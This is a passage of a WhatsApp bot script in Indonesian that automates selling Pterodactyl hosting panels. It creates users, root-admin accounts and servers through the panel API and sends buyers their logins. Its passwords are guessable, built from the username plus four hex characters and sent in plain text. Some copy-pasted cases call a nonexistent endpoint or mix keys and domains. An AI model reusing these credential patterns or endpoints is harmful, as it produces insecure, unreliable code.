          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "cunli": {
       
    if (!isReseller && !isCreator) return m.reply(mess.prem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "cunli-v2": {
if (!isPremium && !isCreator) return m.reply(mess.prem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await dwiaff.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/314/550520829_media.jpg" 
if (!u) return
let d = (await dwiaff.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id} ✅`)
ctf = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
dwiaff.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: dwiaff.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
/*==============================================*/
case "cadmin": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
📘 *Panduan:* ${linkytb}  
📱 *Sosmed:* ${sosmed}  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
}
break

case "cadmin-v2": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
📘 *Panduan:* ${linkytb}  
📱 *Sosmed:* ${sosmed}  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
}
break
/*==============================================*/

case 'cpanel': {
if (!isReseller && !isCreator) return m.reply(mess.prem)
if (!q) return m.reply(example("username"))
global.panel = [text.toLowerCase()]
  let teksHeader = `
ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ ʀᴀᴍ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️",  
rows: [{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟷ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟷ɢʙ", id: `.1gb1` },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟸ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟸ɢʙ", id: ".2gb1" },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟹ɢʙ", description: " ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟹ɢʙ", id: ".3gb1" }, 
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟺ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟺ɢʙ", id: ".4gb1" },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟻ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟻ɢʙ", id: ".5gb1" },
{ title: "⚡️ᴄᴘᴀɴᴇʟ 𝟼ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟼ɢʙ", id: ".6gb1" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟽ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟽ɢʙ", id: ".7gb1" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟾ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟾ɢʙ", id: ".8gb1" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟿ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟿ɢʙ", id: ".9gb1" },
{ title: "ᴄᴘᴀɴᴇʟ ⚡ 𝟷𝟶ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴄᴘᴀɴᴇʟ 𝟷𝟶ɢʙ", id: ".10gb1" },
{ title: "⚡ ᴄᴘᴀɴᴇʟ ᴜɴʟɪᴍɪᴛᴇᴅ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ ᴜɴʟɪᴍɪᴛᴇᴅ", id: ".unli1" }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case 'cpanel-v2': {
if (!isReseller && !isCreator) return m.reply(mess.prem)
if (!q) return m.reply(example("username"))
global.panel = [text.toLowerCase()]
  let teksHeader = `
ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ
  `;
dwiaff.sendMessage(m.chat, {
  text: teksHeader, 
  footer: "ᴄʀᴇᴀᴛᴏʀ ᴅᴡɪᴀғғ ツ",
  buttons: [
  {
    buttonId: 'action',
    buttonText: {
      displayText: 'ini pesan interactiveMeta'
    },
    type: 4,
    nativeFlowInfo: {
      name: 'single_select',
      paramsJson: JSON.stringify({
        title: 'ᴘɪʟɪʜ ʀᴀᴍ',
        sections: [
{ title: "✨️ᴘɪʟɪʜ ʀᴀᴍ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ✨️", 
rows: [{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟷ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟷ɢʙ", id: `.1gb2` },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟸ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟸ɢʙ", id: ".2gb2" },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟹ɢʙ", description: " ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟹ɢʙ", id: ".3gb2" }, 
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟺ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟺ɢʙ", id: ".4gb2" },
{ title: "👑 ᴄᴘᴀɴᴇʟ 𝟻ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟻ɢʙ", id: ".5gb2" },
{ title: "⚡️ᴄᴘᴀɴᴇʟ 𝟼ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟼ɢʙ", id: ".6gb2" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟽ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟽ɢʙ", id: ".7gb2" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟾ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟾ɢʙ", id: ".8gb2" },
{ title: "⚡ᴄᴘᴀɴᴇʟ 𝟿ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ 𝟿ɢʙ", id: ".9gb2" },
{ title: "ᴄᴘᴀɴᴇʟ ⚡ 𝟷𝟶ɢʙ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴄᴘᴀɴᴇʟ 𝟷𝟶ɢʙ", id: ".10gb2" },
{ title: "⚡ ᴄᴘᴀɴᴇʟ ᴜɴʟɪᴍɪᴛᴇᴅ", description: "ᴍᴇᴍʙᴜᴀᴛ ᴘᴀɴᴇʟ ᴜɴʟɪᴍɪᴛᴇᴅ", id: ".unli2" }, 
]}],
})},
}],
headerType: 1,
viewOnce: true
}, { quoted: qloc });
}
break;

case "1gb1": case "2gb1": case "3gb1": case "4gb1": case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
if (!isCreator && !isPremium) return reply(mess.owner)
if (global.panel == undefined) return m.reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb1") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb1") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb1") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb1") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb1") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb1") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb1") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb1") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb1") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb1") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unlimited2": case "unli2": {
if (!isCreator && !isPremium) return reply(mess.owner)
if (global.panel == undefined) return m.reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb2") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb2") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb2") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb2") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb2") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb2") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb2") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb2") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb2") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb2") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isReseller && !isCreator) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
